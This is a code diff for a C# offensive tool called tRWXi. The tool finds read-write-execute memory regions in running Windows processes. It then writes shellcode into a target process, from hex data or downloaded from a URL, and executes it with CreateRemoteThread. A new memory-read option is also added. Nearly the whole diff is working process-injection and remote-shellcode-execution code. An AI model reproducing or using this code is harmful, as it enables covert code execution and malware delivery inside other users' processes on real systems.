@@ -4,7 +4,6 @@ using System.Runtime.InteropServices;
 using System.Security;
 using System.Collections.Generic;
 using tRWXi.Data;
-using tRWXi.Utils;
 using System.Linq;
 
 namespace tRWXi
@@ -66,6 +65,9 @@ namespace tRWXi
         [DllImport("kernel32.dll")]
         static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags,IntPtr lpThreadId);
 
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+
         private const Int32 TH32CS_SNAPPROCESS = 0x02;
         private const Int32 PAGE_EXECUTE_READ_WRITE = 0x40;
         private const Int32 MEM_COMMIT = 0x1000;
@@ -91,27 +93,9 @@ namespace tRWXi
 
                 Dictionary<int, List<Data.ProcessMemoryInfo>> processes = new Dictionary<int, List<ProcessMemoryInfo>>();
 
-                IntPtr nbw = IntPtr.Zero;
+                IntPtr numberOfBytesWritten = IntPtr.Zero;
 
-                if (parameters.ContainsKey("trigger"))
-                {
-                    if (parameters.ContainsKey("pid") && parameters.ContainsKey("address"))
-                    {
-                        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, Convert.ToInt32(parameters["pid"]));
-                        IntPtr res = CreateRemoteThread(hProcess, IntPtr.Zero, 0, new IntPtr(Convert.ToInt64(parameters["address"], 16)), IntPtr.Zero, 0, IntPtr.Zero);
-                        Console.WriteLine("[!] Trying to execute code from provided memory");
-                        if (res != null)
-                        {
-                            Console.WriteLine(String.Format("[+] Successfully executed code. Thread handle [{0}] has been created", res.ToInt64()));
-                        }
-                        Environment.Exit(1);
-                    } else
-                    {
-                        Helper.help();
-                        Environment.Exit(0);
-                    }
-                }
-                if (parameters.ContainsKey("enumerate") || (parameters.ContainsKey("url") && parameters.ContainsKey("pid")))
+                if (parameters.ContainsKey("enumerate"))
                 {
                     Console.WriteLine("[!] Started enumeration");
 
@@ -129,37 +113,71 @@ namespace tRWXi
                                     processes[(int)pe.th32ProcessID] = new List<ProcessMemoryInfo>();
                                 }
                                 processes[(int)pe.th32ProcessID].Add(new ProcessMemoryInfo((int)pe.th32ProcessID, pe.szExeFile, hProcess, mbi.BaseAddress, mbi.RegionSize));
-
-                                if (parameters.ContainsKey("inject"))
-                                {
-                                    if (parameters.ContainsKey("pid") && parameters.ContainsKey("url"))
-                                    {
-                                        if (Convert.ToInt32(parameters["pid"]) == (int)pe.th32ProcessID)
-                                        {
-                                            Console.WriteLine("[!] Started injection");
-                                            string url = parameters["url"];
-                                            byte[] shellcode = Utils.Shellcoder.fetch(url);
-                                            WriteProcessMemory(hProcess, mbi.BaseAddress, shellcode, shellcode.Length, out nbw);
-                                            Console.WriteLine("Written " + nbw.ToString() + " bytes into RWX region");
-                                            CreateRemoteThread(hProcess, IntPtr.Zero, 0, mbi.BaseAddress, IntPtr.Zero, 0, IntPtr.Zero);
-                                        }
-                                    }
-                                    else
-                                    {
-                                        Helper.help();
-                                        Environment.Exit(0);
-                                    }
-                                }
                             }
                         }
                         CloseHandle(hProcess);
                         hResult = Process32Next(hSnapshot, ref pe);
                         lpAddress = IntPtr.Zero;
                     }
-                } else
+                }
+                else if (parameters.ContainsKey("inject") || parameters.ContainsKey("trigger") || parameters.ContainsKey("read"))
+                {
+                    if (parameters.ContainsKey("pid") && parameters.ContainsKey("address"))
+                    {
+                        int pid = Convert.ToInt32(parameters["pid"]);
+                        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
+                        IntPtr addr = new IntPtr(Convert.ToInt64(parameters["address"], 16));
+
+                        if (parameters.ContainsKey("read"))
+                        {
+                            int size = Convert.ToInt32(parameters["size"]);
+                            byte[] output = new byte[size];
+                            IntPtr written = new IntPtr();
+                            ReadProcessMemory(hProcess, addr, output, size, out written);
+                            Console.WriteLine(String.Format("[+] Memory [{0}] content: {1}", addr, BitConverter.ToString(output)));
+                        }
+                        else if (parameters.ContainsKey("inject"))
+                        {
+                            byte[] data;
+                            if (parameters.ContainsKey("data"))
+                            {
+                                data = Utils.Shellcoder.convert(parameters["data"]);
+                            }
+                            else if (parameters.ContainsKey("url"))
+                            {
+                                data = Utils.Shellcoder.fetch(parameters["url"]);
+                            }
+                            else
+                            {
+                                data = new byte[] { };
+                            }
+                            Console.WriteLine("[!] Started injection");
+                            WriteProcessMemory(hProcess, addr, data, data.Length, out numberOfBytesWritten);
+                            Console.WriteLine(String.Format("[+] {0} bytes written into RWX region", numberOfBytesWritten));
+                            CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+                        }
+                        else if (parameters.ContainsKey("trigger"))
+                        {    
+                            IntPtr res = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+                            Console.WriteLine("[!] Trying to execute code from provided memory");
+                            if ((int)res != 0)
+                            {
+                                Console.WriteLine(String.Format("[+] Successfully executed code. Thread handle [{0}] has been created", res.ToInt64()));
+                            }
+                            Environment.Exit(0);
+                        }
+                        else {}
+                    }
+                    else
+                    {
+                        Utils.Helper.help();
+                        Environment.Exit(1);
+                    }
+                }
+                else
                 {
                     Utils.Helper.help();
-                    Environment.Exit(0);
+                    Environment.Exit(1);
                 }
                 
                 CloseHandle(hSnapshot);
@@ -172,7 +190,7 @@ namespace tRWXi
                         Console.WriteLine(String.Format("[+] {0} -> {1}: ", kv.Key, pName));
                         foreach (ProcessMemoryInfo pmi in kv.Value)
                         {
-                            Console.WriteLine(String.Format("\thandler::{0}\tbaseAddress::0x{1:X}\tsize::{2}", pmi.handler, pmi.baseAddress.ToInt64(), pmi.size));
+                            Console.WriteLine(String.Format("\thandler::{0}\tbaseAddress:0x{1:X}\tsize::{3}", pmi.handler, pmi.baseAddress.ToInt64(), pmi.baseAddress, pmi.size));
                         }
                     }
                 }
